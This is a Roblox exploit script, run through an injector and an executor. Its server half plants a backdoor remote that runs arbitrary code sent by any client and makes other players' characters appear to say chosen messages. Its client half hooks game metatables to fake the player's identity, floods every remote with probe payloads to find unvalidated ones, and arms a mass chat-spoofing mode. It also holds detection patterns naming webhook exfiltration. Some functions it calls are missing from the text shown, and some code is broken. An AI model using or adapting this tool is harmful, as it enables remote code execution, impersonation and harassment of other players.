-- ================================================================
--  Chat Control + SS Bridge — Combined
--  Run this same script TWICE:
--    1) via a server injection → sets up the SS bridge
--    2) via client executor   → opens the chat GUI
--  Both point to the same raw URL.
-- ================================================================
local RunService = game:GetService("RunService")

-- ══════════════════════════════════════════════════════════════════
--  SERVER SIDE — SS Bridge
-- ══════════════════════════════════════════════════════════════════
if RunService:IsServer() then

local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Chat    = game:GetService("Chat")

local BRIDGE_NAME = "SS_ExecBridge"

-- destroy any stale bridge
local old = RS:FindFirstChild(BRIDGE_NAME)
if old then old:Destroy() end

local Bridge      = Instance.new("RemoteFunction")
Bridge.Name       = BRIDGE_NAME
Bridge.Parent     = RS

local CHAT_KW = {"chat","say","speak","voice","message","talk","text","mic"}

Bridge.OnServerInvoke = function(player, action, payload)
    payload = payload or {}

    if action == "ping" then
        return {ok=true, msg="pong"}

    elseif action == "chat" then
        local target  = tostring(payload.target  or "")
        local message = tostring(payload.message or "")
        local display = tostring(payload.display or "")
        if message == "" then return {ok=false, msg="No message."} end

        local plr  = Players:FindFirstChild(target)
        local char = plr and plr.Character
        if not char then
            return {ok=false, msg="Player/char not found: "..target}
        end
        local fakeName = display ~= "" and display or plr.DisplayName

        -- Bubble chat — server-side, replicated to every client ✓
        pcall(function() Chat:Chat(char, message, Enum.ChatColor.White) end)

        -- FireAllClients on every RS chat remote with spoofed name.
        -- Triggers the game's own client-side chat display handlers.
        local fired = 0
        for _, v in ipairs(RS:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                local n = v.Name:lower()
                for _, kw in ipairs(CHAT_KW) do
                    if n:find(kw) then
                        pcall(function() v:FireAllClients(fakeName, message) end)
                        pcall(function() v:FireAllClients(message, fakeName) end)
                        pcall(function() v:FireAllClients(plr.Name, message, fakeName) end)
                        pcall(function() v:FireAllClients({Name=fakeName, Message=message}) end)
                        fired = fired + 1
                        break
                    end
                end
            end
        end

        return {
            ok  = true,
            msg = "Chat:Chat sent + "..fired.." remote(s) FireAllClients as \""..fakeName.."\""
        }

    elseif action == "ls" then
        local code = payload.code
        if type(code) ~= "string" or code == "" then
            return {ok=false, msg="No code."}
        end
        local fn, err = loadstring(code)
        if not fn then return {ok=false, msg="Compile: "..tostring(err)} end
        local ok, e = pcall(fn)
        return ok and {ok=true, msg="OK."} or {ok=false, msg="Runtime: "..tostring(e)}

    elseif action == "scan_vulns" then
        local results = {}
        local CRIT = {
            "_G%.backdoor","getfenv%s*%(%)%.loadstring","discord%.com/api/webhooks",
            "loadstring%(game%.HttpGet","webhook%.site","hookbin%.com","pipedream%.net",
        }
        local HIGH = {
            "syn%.request","http%.request","https%.request","setfenv%s*%(",
            "game%.HttpGet.*exec","require%s*%(%s*%d%d%d%d%d+%s*%)",
        }
        local SUSP_REM = {
            "admin","exec","cmd","eval","kick","ban","promote","demote",
            "setrank","give","grant","money","currency","bypass","inject",
        }
        local OLD_MDL = {
            "free model","freemodel","backdoor","admin commands","knife","sword",
        }
        local function add(sev, path, cls, detail)
            table.insert(results, sev.."|"..cls.."|"..path.."|"..detail)
        end
        for _, obj in game:GetDescendants() do
            if obj:IsA("LuaSourceContainer") then
                local src = ""; pcall(function() src = obj.Source end)
                if src ~= "" then
                    local low = src:lower(); local hit = false
                    for _, sig in ipairs(CRIT) do
                        if not hit and low:find(sig) then
                            add("CRITICAL",obj:GetFullName(),obj.ClassName,"sig: "..sig); hit=true
                        end
                    end
                    for _, sig in ipairs(HIGH) do
                        if not hit and low:find(sig) then
                            add("HIGH",obj:GetFullName(),obj.ClassName,"sig: "..sig); hit=true
                        end
                    end
                end
            elseif obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                for _, kw in ipairs(SUSP_REM) do
                    if n:find(kw) then
                        add("MEDIUM",obj:GetFullName(),obj.ClassName,"remote: "..obj.Name); break
                    end
                end
            elseif obj:IsA("Model") then
                local n = obj.Name:lower()
                for _, kw in ipairs(OLD_MDL) do
                    if n:find(kw) then
                        add("LOW",obj:GetFullName(),"Model","old model: "..obj.Name); break
                    end
                end
            end
        end
        return {ok=true, msg=#results.." finding(s) — server deep scan", data=results}
    end

    return {ok=false, msg="Unknown: "..tostring(action)}
end

warn("[SS Chat Bridge] Online — "..BRIDGE_NAME)
return  -- server side done

end -- RunService:IsServer()

-- ══════════════════════════════════════════════════════════════════
--  CLIENT SIDE — Chat Control GUI
-- ══════════════════════════════════════════════════════════════════

local RS         = game:GetService("ReplicatedStorage")
local Players    = game:GetService("Players")
local UIS        = game:GetService("UserInputService")
local TweenSvc   = game:GetService("TweenService")
local TCS        = game:GetService("TextChatService")
local ChatSvc    = game:GetService("Chat")
local StarterGui = game:GetService("StarterGui")
local LP         = Players.LocalPlayer
local PGui       = LP:WaitForChild("PlayerGui")

-- SS Bridge — connect to the server half of this same script
local Bridge = RS:FindFirstChild("SS_ExecBridge")
if not Bridge then
    task.spawn(function() Bridge = RS:WaitForChild("SS_ExecBridge", 6) end)
end

local function callBridge(action, payload)
    if not Bridge then return nil end
    local ok, res = pcall(function()
        return Bridge:InvokeServer(action, payload)
    end)
    return ok and res or nil
end

-- ── Remote scanner ────────────────────────────────────────────────
local CHAT_KW     = {"chat","say","speak","voice","bubble","message","talk","text","mic","post","send","submit","input"}
local allRemotes  = {}
local chatRemotes = {}
local trustedRemotes = {}

local function scanAll()
    local found, seen = {}, {}
    local function check(v)
        if seen[v] then return end; seen[v]=true
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(found,v)
        end
    end
    pcall(function() for _,v in ipairs(RS:GetDescendants())               do check(v) end end)
    pcall(function() for _,v in ipairs(workspace:GetDescendants())        do check(v) end end)
    pcall(function() for _,v in ipairs(LP.PlayerScripts:GetDescendants()) do check(v) end end)
    allRemotes  = found
    chatRemotes = {}
    for _,v in ipairs(found) do
        local n=v.Name:lower()
        for _,kw in ipairs(CHAT_KW) do
            if n:find(kw) then table.insert(chatRemotes,v);break end
        end
    end
    return found
end

local function firePatterns(remote, uname, display, msg)
    pcall(function() remote:FireServer(msg) end)
    pcall(function() remote:FireServer(display, msg) end)
    pcall(function() remote:FireServer(uname, msg) end)
    pcall(function() remote:FireServer(msg, display) end)
    pcall(function() remote:FireServer(uname, msg, display) end)
    pcall(function() remote:FireServer(display, msg, uname) end)
    pcall(function() remote:FireServer(uname, display, msg) end)
    pcall(function() remote:FireServer({Message=msg}) end)
    pcall(function() remote:FireServer({Message=msg, Type="Say"}) end)
    pcall(function() remote:FireServer({Message=msg, DisplayName=display}) end)
    pcall(function() remote:FireServer({name=uname, text=msg}) end)
end

-- ── Meta hooks (executor-dependent) ──────────────────────────────
local namecallHook, lpHook = nil, nil
local function hookNamecall(fD, fN)
    return pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        local old = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            if getnamecallmethod()=="FireServer" then
                local args={...}
                for i,v in ipairs(args) do
                    if type(v)=="string" then
                        if v==LP.DisplayName then args[i]=fD
                        elseif v==LP.Name    then args[i]=fN end
                    end
                end
                return old(self, table.unpack(args))
            end
            return old(self, ...)
        end)
        setreadonly(mt, true)
        namecallHook=function()
            pcall(function() setreadonly(mt,false);mt.__namecall=old;setreadonly(mt,true) end)
            namecallHook=nil
        end
    end)
end
local function hookLPName(fD, fN)
    return pcall(function()
        local mt = getrawmetatable(LP)
        setreadonly(mt, false)
        local old = mt.__index
        mt.__index = newcclosure(function(t, k)
            if t==LP then
                if k=="DisplayName" then return fD end
                if k=="Name"        then return fN end
            end
            return old(t, k)
        end)
        setreadonly(mt, true)
        lpHook=function()
            pcall(function() setreadonly(mt,false);mt.__index=old;setreadonly(mt,true) end)
            lpHook=nil
        end
    end)
end
local function unhookAll()
    if namecallHook then pcall(namecallHook) end
    if lpHook       then pcall(lpHook) end
end

-- ── GUI sim ───────────────────────────────────────────────────────
local GUI_KW = {"speech","chat","say","type","input","message","talk","mic","voice","speak","submit","send"}
local function tryGUISimulate(message)
    local candidates = {}
    for _,v in ipairs(PGui:GetDescendants()) do
        if v:IsA("TextBox") then
            local score = 0
            local n, ph = v.Name:lower(), v.PlaceholderText:lower()
            for _,kw in ipairs(GUI_KW) do
                if n:find(kw)  then score=score+3 end
                if ph:find(kw) then score=score+2 end
            end
            local par = v.Parent
            for _=1,4 do
                if not par or par==PGui then break end
                local pn = par.Name:lower()
                for _,kw in ipairs(GUI_KW) do if pn:find(kw) then score=score+1 end end
                par=par.Parent
            end
            if score > 0 then table.insert(candidates,{box=v,score=score,name=v.Name}) end
        end
    end
    table.sort(candidates,function(a,b) return a.score>b.score end)
    for _,c in ipairs(candidates) do
        local box=c.box
        box.Text=message
        pcall(function() box.FocusLost:Fire(true) end)
        task.wait(0.05)
        if box.Parent then
            for _,sib in ipairs(box.Parent:GetDescendants()) do
                if sib:IsA("TextButton") then
                    local sn=sib.Text:lower()
                    if sn=="" or sn==">" or sn=="→" or sn:find("send") or sn:find("say") or sn:find("post") or sn:find("submit") then
                        pcall(function() sib.MouseButton1Click:Fire() end)
                        pcall(function() sib.Activated:Fire() end)
                    end
                end
            end
        end
        return true, "GUI("..c.name..")"
    end
    return false, "no box"
end

-- ── Trust detection ───────────────────────────────────────────────
local function watchForTrust(remote, targetPlr, msg, onTrusted)
    if trustedRemotes[remote] then onTrusted(trustedRemotes[remote]);return end
    local done, conns = false, {}
    local function succeed(m)
        if done then return end; done=true
        for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        onTrusted(m)
    end
    if remote:IsA("RemoteEvent") then
        local ok,c=pcall(function()
            return remote.OnClientEvent:Connect(function(...)
                local args={...}; local matched=(#args==0)
                for _,v in ipairs(args) do if type(v)=="string" and v:find(msg,1,true) then matched=true;break end end
                if matched then succeed("OnClientEvent") end
            end)
        end)
        if ok then table.insert(conns,c) end
    end
    if targetPlr then
        local ok,c=pcall(function()
            return targetPlr.Chatted:Connect(function(m2) if m2:find(msg,1,true) then succeed("Chatted") end end)
        end)
        if ok then table.insert(conns,c) end
    end
    pcall(function()
        local ch = TCS:FindFirstChild("TextChannels")
        if not ch then return end
        for _,c2 in ipairs(ch:GetChildren()) do
            if c2:IsA("TextChannel") then
                local ok2,conn=pcall(function()
                    return c2.MessageReceived:Connect(function(tcMsg)
                        local t=tcMsg.Text or ""
                        if t:find(msg,1,true) and tcMsg.TextSource and tcMsg.TextSource.UserId~=LP.UserId then
                            succeed("TextChannel")
                        end
                    end)
                end)
                if ok2 then table.insert(conns,conn) end
            end
        end
    end)
    task.delay(2, function()
        for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    end)
end

-- ── Helpers ───────────────────────────────────────────────────────
local function tw(i,t,p) TweenSvc:Create(i,t,p):Play() end
local TF = TweenInfo.new(0.14,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)
local TM = TweenInfo.new(0.22,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)
local AC  = Color3.fromRGB(64,156,255)
local BG  = Color3.fromRGB(9,11,22)
local CD  = Color3.fromRGB(14,19,36)
local T1  = Color3.fromRGB(228,240,255)
local T2  = Color3.fromRGB(140,178,235)
local T3  = Color3.fromRGB(68,105,162)
local GRN = Color3.fromRGB(68,224,114)
local RED = Color3.fromRGB(255,88,88)
local ORG = Color3.fromRGB(255,178,60)
local function mkF(par,sz,pos,col,tr)
    local f=Instance.new("Frame");f.Size=sz;f.Position=pos
    f.BackgroundColor3=col;f.BackgroundTransparency=tr or 0
    f.BorderSizePixel=0;f.Parent=par;return f
end
local function mkL(par,txt,fsz,col,pos,sz,xa,bold,wrap)
    local l=Instance.new("TextLabel");l.Text=txt
    l.Font=bold and Enum.Font.GothamBold or Enum.Font.Gotham
    l.TextSize=fsz;l.TextColor3=col;l.BackgroundTransparency=1
    l.Position=pos;l.Size=sz;l.TextXAlignment=xa or Enum.TextXAlignment.Left
    l.TextWrapped=wrap or false;l.TextTruncate=Enum.TextTruncate.AtEnd
    l.BorderSizePixel=0;l.Parent=par;return l
end
local function mkB(par,sz,pos,col,tr)
    local b=Instance.new("TextButton");b.Text=""
    b.Size=sz;b.Position=pos;b.BackgroundColor3=col
    b.BackgroundTransparency=tr or 0;b.BorderSizePixel=0
    b.AutoButtonColor=false;b.Parent=par;return b
end
local function corner(p,r)
    local c=Instance.new("UICorner");c.CornerRadius=UDim.new(0,r or 8);c.Parent=p
end
local function stroke(p,col,tr,th)
    local s=Instance.new("UIStroke");s.Color=col;s.Transparency=tr or 0.7
    s.Thickness=th or 1;s.Parent=p;return s
end
local function card(par,sz,pos)
    local f=mkF(par,sz,pos,CD,0.44);corner(f,10);f.ClipsDescendants=true
    stroke(f,Color3.new(1,1,1),0.82,1)
    mkF(f,UDim2.new(1,-2,0,1),UDim2.new(0,1,0,1),Color3.new(1,1,1),0.80)
    return f
end
local function notify(title,text,dur)
    pcall(function()
        StarterGui:SetCore("SendNotification",{Title=title,Text=text,Duration=dur or 5})
    end)
end

-- ── Vuln scanner ──────────────────────────────────────────────────
local function clientVulnScan()
    local results = {}
    local SUSP_REM = {
        "admin","exec","cmd","eval","kick","ban","promote","demote",
        "setrank","give","grant","money","currency","bypass","inject",
    }
    local function checkObj(v)
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            for _, kw in ipairs(SUSP_REM) do
                if n:find(kw) then
                    table.insert(results,"MEDIUM|"..v.ClassName.."|"..v:GetFullName().."|suspicious remote: "..v.Name)
                    break
                end
            end
        end
    end
    pcall(function() for _,v in ipairs(RS:GetDescendants())        do checkObj(v) end end)
    pcall(function() for _,v in ipairs(workspace:GetDescendants()) do checkObj(v) end end)
    return results
end

-- Active probe: fires test payloads to every RemoteEvent, listens for echoes.
-- Any remote that broadcasts the token back is confirmed unvalidated → LIVE.
local function activeProbe(onDone)
    local token = "PROBE_"..tostring(math.random(100000,999999))
    local targets, conns, liveSet, liveLines = {}, {}, {}, {}

    local function collect(svc)
        pcall(function()
            for _, v in ipairs(svc:GetDescendants()) do
                if v:IsA("RemoteEvent") then table.insert(targets, v) end
            end
        end)
    end
    collect(RS); collect(workspace)
    pcall(function()
        for _, v in ipairs(LP.PlayerScripts:GetDescendants()) do
            if v:IsA("RemoteEvent") then table.insert(targets, v) end
        end
    end)

    if #targets == 0 then onDone({}); return end

    -- listeners first, then fire
    for _, re in ipairs(targets) do
        local r = re
        local ok, c = pcall(function()
            return r.OnClientEvent:Connect(function(...)
                if liveSet[r] then return end
                local args = {...}
                for _, v in ipairs(args) do
                    if type(v)=="string" and v:find(token,1,true) then
                        liveSet[r]=true
                        table.insert(liveLines,
                            "LIVE|"..r.ClassName.."|"..r:GetFullName()..
                            "|echoed back — server broadcasts client args unvalidated!")
                        break
                    end
                end
            end)
        end)
        if ok then table.insert(conns,c) end
    end

    for _, re in ipairs(targets) do
        local r = re
        pcall(function() r:FireServer(token) end)
        pcall(function() r:FireServer(LP.Name, token) end)
        pcall(function() r:FireServer(LP.DisplayName, token) end)
        pcall(function() r:FireServer({Message=token, Type="Say"}) end)
        pcall(function() r:FireServer({text=token}) end)
    end

    task.delay(2.5, function()
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        onDone(liveLines)
    end)
end

local function showVulnResults(lines, source)
    local old2 = PGui:FindFirstChild("__VulnResults__"); if old2 then old2:Destroy() end
    if #lines == 0 then notify("Vuln Scan","No findings ("..source..")",4); return end
    local SG2 = Instance.new("ScreenGui")
    SG2.Name="__VulnResults__"; SG2.ResetOnSpawn=false
    SG2.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    SG2.IgnoreGuiInset=true; SG2.Parent=PGui

    local VW,VH = 480,380
    local VWIN = mkF(SG2,UDim2.new(0,VW,0,VH),UDim2.new(0.5,10,0.5,-VH/2),BG,0.18)
    corner(VWIN,14); VWIN.ClipsDescendants=true
    stroke(VWIN,ORG,0.46,1.5)
    mkF(VWIN,UDim2.new(1,0,0,2),UDim2.new(0,0,0,0),ORG,0.80)

    local VTB = mkF(VWIN,UDim2.new(1,0,0,40),UDim2.new(0,0,0,0),BG,1)
    mkF(VTB,UDim2.new(1,0,0,1),UDim2.new(0,0,1,-1),Color3.new(1,1,1),0.88)
    local vgemF = mkF(VTB,UDim2.new(0,24,0,24),UDim2.new(0,12,0.5,-12),ORG,0.16)
    corner(vgemF,7); stroke(vgemF,ORG,0.38,1)
    mkL(vgemF,"⚡",12,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
    mkL(VTB,"Vulnerability Report",14,T1,UDim2.new(0,44,0,0),UDim2.new(0,165,1,0),Enum.TextXAlignment.Left,true)
    mkL(VTB,source.." · "..(#lines).." finding(s)",9,T3,UDim2.new(0,44,0,0),UDim2.new(0,220,1,0),Enum.TextXAlignment.Left,false)

    local vcBtn = mkB(VTB,UDim2.new(0,13,0,13),UDim2.new(1,-20,0.5,-6),RED,0.10); corner(vcBtn,7)
    vcBtn.MouseButton1Click:Connect(function() SG2:Destroy() end)

    local vScroll = Instance.new("ScrollingFrame")
    vScroll.Size=UDim2.new(1,0,1,-44); vScroll.Position=UDim2.new(0,0,0,44)
    vScroll.BackgroundTransparency=1; vScroll.BorderSizePixel=0
    vScroll.ScrollBarThickness=3; vScroll.ScrollBarImageColor3=ORG
    vScroll.CanvasSize=UDim2.new(0,0,0,0); vScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
    vScroll.ScrollingDirection=Enum.ScrollingDirection.Y; vScroll.Parent=VWIN
    Instance.new("UIListLayout",vScroll).Padding=UDim.new(0,2)
    local vPad=Instance.new("UIPadding",vScroll)
    vPad.PaddingLeft=UDim.new(0,8); vPad.PaddingRight=UDim.new(0,8); vPad.PaddingTop=UDim.new(0,6)

    local SEVCOL = {
        LIVE     = Color3.fromRGB(255,60,220),
        CRITICAL = Color3.fromRGB(255,60,60),
        HIGH     = Color3.fromRGB(255,120,40),
        MEDIUM   = Color3.fromRGB(255,200,40),
        LOW      = Color3.fromRGB(120,200,255),
    }
    for _, line in ipairs(lines) do
        local sev,cls,path,detail = line:match("^([^|]+)|([^|]+)|([^|]+)|(.+)$")
        sev=sev or "?"; cls=cls or "?"; path=path or line; detail=detail or ""
        local col = SEVCOL[sev] or Color3.new(1,1,1)
        local row = mkF(vScroll,UDim2.new(1,0,0,50),UDim2.new(0,0,0,0),CD,0.50)
        corner(row,7); row.ClipsDescendants=true; stroke(row,col,0.60,1)
        mkF(row,UDim2.new(0,3,1,-8),UDim2.new(0,0,0,4),col,0)
        local badge = mkF(row,UDim2.new(0,60,0,16),UDim2.new(0,8,0,6),col,0.70); corner(badge,4)
        mkL(badge,sev,8,col,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
        mkL(row,path,10,T1,UDim2.new(0,74,0,4),UDim2.new(1,-82,0,15),Enum.TextXAlignment.Left,true)
        mkL(row,cls.." · "..detail,9,T2,UDim2.new(0,8,0,24),UDim2.new(1,-16,0,14),Enum.TextXAlignment.Left,false,true)
    end

    do -- drag the popup
        local vd,vds,vsp = false,nil,nil
        VTB.InputBegan:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseButton1
            or i.UserInputType==Enum.UserInputType.Touch then
                vd=true; vds=i.Position; vsp=VWIN.Position
                i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then vd=false end end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if vd and vds and (i.UserInputType==Enum.UserInputType.MouseMovement
            or i.UserInputType==Enum.UserInputType.Touch) then
                local dv=i.Position-vds
                VWIN.Position=UDim2.new(vsp.X.Scale,vsp.X.Offset+dv.X,vsp.Y.Scale,vsp.Y.Offset+dv.Y)
            end
        end)
    end

    VWIN.BackgroundTransparency=1; VWIN.Size=UDim2.new(0,VW*0.88,0,VH*0.88)
    TweenSvc:Create(VWIN,TweenInfo.new(0.40,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
        {Size=UDim2.new(0,VW,0,VH),BackgroundTransparency=0.18}):Play()
end

-- Resolve a fullpath string to its Instance (or nil)
local function pathToObj(path)
    local obj = game
    for part in path:gmatch("[^.]+") do
        if obj then obj = obj:FindFirstChild(part) end
    end
    return (obj and obj ~= game) and obj or nil
end

-- Add obj to allRemotes / chatRemotes if not already present
local function registerRemote(obj)
    if not (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then return false end
    for _, r in ipairs(allRemotes) do if r==obj then return false end end
    table.insert(allRemotes, obj)
    table.insert(chatRemotes, obj)
    return true
end

local function doVulnScan()
    notify("Vuln Scan","Scanning + probing all remotes…",3)
    task.spawn(function()
        -- 1. Static scan (sig/name patterns)
        local staticLines, source
        if Bridge and Bridge.Parent then
            local res = callBridge("scan_vulns",{})
            if res and res.ok then
                staticLines = res.data or {}; source = "SS server (deep)"
            end
        end
        if not staticLines then
            staticLines = clientVulnScan(); source = "client-only"
        end

        -- 2. Active probe (fires to every RemoteEvent, listens for echoes)
        activeProbe(function(liveLines)
            local merged = {}
            for _, l in ipairs(liveLines)   do table.insert(merged, l) end
            for _, l in ipairs(staticLines) do table.insert(merged, l) end

            -- 3. Wire ALL found remotes into the chat system
            local added, liveObjs = 0, {}
            for _, line in ipairs(merged) do
                local sev, cls, path = line:match("^([^|]+)|([^|]+)|([^|]+)|")
                if path and (cls=="RemoteEvent" or cls=="RemoteFunction") then
                    local obj = pathToObj(path)
                    if obj then
                        if registerRemote(obj) then added=added+1 end
                        if sev=="LIVE" then
                            table.insert(liveObjs, obj)
                            markTrusted(obj,"LIVE probe")
                        end
                    end
                end
            end

            -- rebuild remote list with everything we found
            if added > 0 then rebuildRemoteList(allRemotes) end

            -- 4. Auto-select best remote and mode
            local bestRemote = liveObjs[1]   -- prefer LIVE
            if not bestRemote and #chatRemotes>0 then bestRemote=chatRemotes[1] end
            if bestRemote then selectRemote(bestRemote) end

            local newMode = #liveObjs>0 and 3 or (#added>1 and 3 or 4)
            modeIdx = newMode; setModeNote()
            for j,bt in ipairs(modeBtns) do
                tw(bt.bg,TF,{BackgroundTransparency=j==newMode and 0.72 or 1})
                bt.lbl.Font=j==newMode and Enum.Font.GothamBold or Enum.Font.Gotham
                bt.lbl.TextColor3=j==newMode and T1 or T3
            end

            -- 5. Show results popup
            local src = source..(" + "..#liveLines.." LIVE + "..added.." wired")
            showVulnResults(merged, src)

            -- 6. Status + notifications
            if #liveObjs > 0 then
                notify("LIVE! "..#liveObjs.." remote(s)",
                    "Broadcasting unvalidated — Spoof All ready!",8)
                if statusL then
                    statusL.Text = #liveObjs.." LIVE + "..(added-#liveObjs).." flagged wired into Spoof All"
                    statusL.TextColor3 = Color3.fromRGB(255,60,220)
                end
            elseif added > 0 then
                notify("Audit done",added.." remote(s) added to Spoof All",5)
                if statusL then
                    statusL.Text = added.." vuln remote(s) added — Spoof All armed"
                    statusL.TextColor3 = ORG
                end
            else
                notify("Audit done","No flagged remotes found",4)
            end
        end)
    end)
end

-- ── GUI ───────────────────────────────────────────────────────────
local old=PGui:FindFirstChild("NPCChatControl"); if old then old:Destroy() end
local SG=Instance.new("ScreenGui")
SG.Name="NPCChatControl";SG.ResetOnSpawn=false
SG.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
SG.IgnoreGuiInset=true;SG.Parent=PGui

local W,H=540,480
local WIN=mkF(SG,UDim2.new(0,W,0,H),UDim2.new(0.5,-W/2,0.5,-H/2),BG,0.18)
corner(WIN,14);WIN.ClipsDescendants=true
stroke(WIN,AC,0.46,1.5)
mkF(WIN,UDim2.new(1,0,0,2),UDim2.new(0,0,0,0),AC,0.80)

local TB=mkF(WIN,UDim2.new(1,0,0,46),UDim2.new(0,0,0,0),BG,1)
mkF(TB,UDim2.new(1,0,0,1),UDim2.new(0,0,1,-1),Color3.new(1,1,1),0.88)
local gemF=mkF(TB,UDim2.new(0,24,0,24),UDim2.new(0,12,0.5,-12),AC,0.16);corner(gemF,7)
stroke(gemF,AC,0.38,1)
mkL(gemF,"◆",12,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
mkL(TB,"Chat Control",14,T1,UDim2.new(0,44,0,0),UDim2.new(0,114,1,0),Enum.TextXAlignment.Left,true)
mkL(TB,"SS + FE spoof",9,T3,UDim2.new(0,44,0,0),UDim2.new(0,170,1,0),Enum.TextXAlignment.Left,false)

-- bridge status pill
local bPill=mkF(TB,UDim2.new(0,76,0,18),UDim2.new(0,220,0.5,-9),CD,0.40);corner(bPill,9)
local bPillStroke=stroke(bPill,T3,0.60,1)
local bDot=mkF(bPill,UDim2.new(0,6,0,6),UDim2.new(0,6,0.5,-3),RED,0);corner(bDot,3)
local bLbl=mkL(bPill,"SS offline",9,RED,UDim2.new(0,16,0,0),UDim2.new(1,-18,1,0),Enum.TextXAlignment.Left,false)

local function winBtn(xOff,col,cb)
    local b=mkB(TB,UDim2.new(0,13,0,13),UDim2.new(1,xOff,0.5,-6),col,0.10);corner(b,7)
    b.MouseEnter:Connect(function() tw(b,TF,{BackgroundTransparency=0}) end)
    b.MouseLeave:Connect(function() tw(b,TF,{BackgroundTransparency=0.10}) end)
    b.MouseButton1Click:Connect(cb)
end
winBtn(-30,RED,function()
    tw(WIN,TweenInfo.new(0.20,Enum.EasingStyle.Quart,Enum.EasingDirection.In),
        {BackgroundTransparency=1,Size=UDim2.new(0,W*0.90,0,H*0.90)})
    task.delay(0.22,function() SG:Destroy() end)
end)
local minimized=false
winBtn(-48,Color3.fromRGB(255,190,55),function()
    minimized=not minimized
    tw(WIN,TM,{Size=minimized and UDim2.new(0,W,0,46) or UDim2.new(0,W,0,H)})
end)

-- ⚡ Audit button in titlebar
local auditBg=mkF(TB,UDim2.new(0,56,0,18),UDim2.new(0,302,0.5,-9),ORG,0.72); corner(auditBg,9)
stroke(auditBg,ORG,0.40,1)
mkL(auditBg,"⚡ Audit",9,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
local auditHit=mkB(TB,UDim2.new(0,56,0,18),UDim2.new(0,302,0.5,-9),ORG,1); auditHit.ZIndex=3
auditHit.MouseEnter:Connect(function() tw(auditBg,TF,{BackgroundTransparency=0.44}) end)
auditHit.MouseLeave:Connect(function() tw(auditBg,TM,{BackgroundTransparency=0.72}) end)
auditHit.MouseButton1Click:Connect(function() doVulnScan() end)

do -- drag
    local drag,ds,sp,last=false,nil,nil,nil
    TB.InputBegan:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1
        or i.UserInputType==Enum.UserInputType.Touch then
            drag=true;ds=i.Position;sp=WIN.Position
            i.Changed:Connect(function()
                if i.UserInputState==Enum.UserInputState.End then drag=false end
            end)
        end
    end)
    TB.InputChanged:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseMovement
        or i.UserInputType==Enum.UserInputType.Touch then last=i end
    end)
    UIS.InputChanged:Connect(function(i)
        if i==last and drag and ds then
            local d=i.Position-ds
            WIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
        end
    end)
end

local BODY=mkF(WIN,UDim2.new(1,0,1,-46),UDim2.new(0,0,0,46),BG,1)

-- LEFT: player list
local LEFT=mkF(BODY,UDim2.new(0,196,1,0),UDim2.new(0,0,0,0),BG,1)
mkF(LEFT,UDim2.new(0,1,1,0),UDim2.new(1,-1,0,0),Color3.new(1,1,1),0.90)
mkL(LEFT,"PLAYERS",9,T3,UDim2.new(0,10,0,7),UDim2.new(1,-10,0,14),Enum.TextXAlignment.Left,true)
mkF(LEFT,UDim2.new(1,-12,0,1),UDim2.new(0,6,0,22),AC,0.68)
local plScroll=Instance.new("ScrollingFrame")
plScroll.Size=UDim2.new(1,0,1,-26);plScroll.Position=UDim2.new(0,0,0,26)
plScroll.BackgroundTransparency=1;plScroll.BorderSizePixel=0
plScroll.ScrollBarThickness=3;plScroll.ScrollBarImageColor3=AC
plScroll.CanvasSize=UDim2.new(0,0,0,0);plScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
plScroll.ScrollingDirection=Enum.ScrollingDirection.Y;plScroll.Parent=LEFT
local plLL=Instance.new("UIListLayout",plScroll);plLL.Padding=UDim.new(0,3)
local plPad=Instance.new("UIPadding",plScroll)
plPad.PaddingLeft=UDim.new(0,6);plPad.PaddingRight=UDim.new(0,6);plPad.PaddingTop=UDim.new(0,5)

-- RIGHT: controls
local RIGHT=mkF(BODY,UDim2.new(1,-196,1,0),UDim2.new(0,196,0,0),BG,1)

local selCard=card(RIGHT,UDim2.new(1,-14,0,42),UDim2.new(0,7,0,8))
mkL(selCard,"SELECTED",8,T3,UDim2.new(0,10,0,4),UDim2.new(1,-10,0,11),Enum.TextXAlignment.Left,true)
local selL=mkL(selCard,"— tap a player —",12,T2,UDim2.new(0,10,0,17),UDim2.new(1,-12,0,16),Enum.TextXAlignment.Left,false)

mkL(RIGHT,"SEND MODE",8,T3,UDim2.new(0,10,0,58),UDim2.new(1,-10,0,12),Enum.TextXAlignment.Left,true)
mkF(RIGHT,UDim2.new(1,-14,0,1),UDim2.new(0,7,0,70),AC,0.70)

local MODES  = {"Server","As Me","Spoof All","Targeted"}
local MNOTES = {
    "SS Bridge — Chat:Chat server-side, 100% visible to all ✓",
    "YOU say it — TextChatService / old chat / GUI sim",
    "Fires every remote + meta hooks — detects trusted",
    "Fires only the selected remote + hooks",
}
local modeIdx  = 1
local modeBtns = {}
local modeNoteL= mkL(RIGHT,"",8,T3,UDim2.new(0,10,1,-14),UDim2.new(1,-14,0,12),Enum.TextXAlignment.Left,false,true)
